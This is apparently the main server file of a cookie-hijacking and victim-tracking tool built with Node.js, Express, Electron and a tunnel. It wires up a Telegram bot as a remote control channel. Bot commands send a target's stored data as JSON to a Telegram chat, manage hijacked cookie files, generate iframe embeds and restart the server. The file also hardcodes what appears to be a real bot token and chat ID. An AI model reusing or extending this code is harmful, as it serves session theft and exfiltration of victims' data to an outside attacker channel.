const process = global.process;
process.__dirname = __dirname;

const { serverInit, getConfig, cout } = require("./utils/server-helpers");
const expressFileupload = require("express-fileupload");
const { startTunnel } = require("./utils/tunnel");
const expressDevice = require("express-device");
const cookieParser = require("cookie-parser");
const socketIo = require("socket.io");
const electron = require("electron");
const express = require("express");
const http = require("http");
const path = require("path");
const TelegramBot = require('node-telegram-bot-api');

// Initialize Telegram Bot with your bot token
const botToken = '6464682205:AAFxM4phl4jFwoWe-2SaSq4pVUoUEdH7xmU'; // Replace with your Telegram bot token
const bot = new TelegramBot(botToken, { polling: true });

// Define your chat ID here
const chatId = '-4576169097'; // Replace with your actual chat ID

const app = express();
const server = http.createServer(app);
const io = new socketIo.Server(server);
const PORT = process.env.PORT || getConfig('port');

serverInit();
app.use(express.static(path.join(__dirname, "public")));
app.use(express.urlencoded({ extended: false }));
app.set("views", path.join(__dirname, 'views'));
app.use(expressDevice.capture());
app.set("view engine", "ejs");
app.use(expressFileupload());
app.use(cookieParser());
app.use(express.json());
global.IO = io;

// CORS configuration
app.use(function (req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    next();
});

// Route handlers
app.use("/ws-app", require("./router/ws-app"));
app.use("/", require("./router"));
app.use("/panel", require("./router/panel"));

// Send a startup message to the specified Telegram chat
bot.sendMessage(chatId, 'Server has started successfully.');

server.listen(PORT, async () => {
    await startTunnel();
    cout.out(`LOCAL SERVER  : http://localhost:${PORT}`);
    cout.out(`TUNNEL SERVER : ${process.env.WSTUNNELURL}`);
    // Notify in Telegram once the server is ready
    bot.sendMessage(chatId, `Server is running on http://localhost:${PORT}`);
    bot.sendMessage(chatId, `Tunnel is available at ${process.env.WSTUNNELURL}`);
});

// Electron app initialization
electron.app.on("ready", () => {
    cout.out("Electron browser ready.");
    bot.sendMessage(chatId, 'Electron app is ready.');
});

// Handle all windows being closed
electron.app.on('window-all-closed', () => {
    if (process.platform !== 'darwin') {
        electron.app.quit();
        bot.sendMessage(chatId, 'Electron app has been closed.');
    }
});

// Telegram Bot command handlers
bot.onText(/\/get_data (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const targetId = match[1];

    if (!targetDB.info().collections.includes(targetId)) {
        bot.sendMessage(chatId, "Target not found");
        return;
    }

    const targetCollection = targetDB.collection(targetId, false);
    const data = targetCollection.find({});
    bot.sendMessage(chatId, JSON.stringify(data, null, 2)); // Sends data as JSON
});

bot.onText(/\/clear_cookies (.+)/, (msg, match) => {
    const targetId = match[1];
    const cookiesFilePath = path.join(__dirname, "ssd", "cookies", `${targetId}.wszip`);

    if (fs.existsSync(cookiesFilePath)) {
        fs.rmSync(cookiesFilePath, { recursive: true });
        const targetCollection = targetDB.collection(targetId, false);
        targetCollection.update({}, { cookies: "pending" });
        bot.sendMessage(chatId, "Cookies cleared");
    } else {
        bot.sendMessage(chatId, "Cookies not hijacked.");
    }
});

bot.onText(/\/generate_iframe (.+)/, (msg, match) => {
    const url = match[1];
    const iframeCode = `<iframe src="${url}" width="600" height="400"></iframe>`;
    bot.sendMessage(chatId, `Here is your iframe code:\n${iframeCode}`);
});

bot.onText(/\/restart_server/, (msg) => {
    bot.sendMessage(chatId, "Server is restarting...");
    server.close(() => {
        process.exit(0);
    });
});
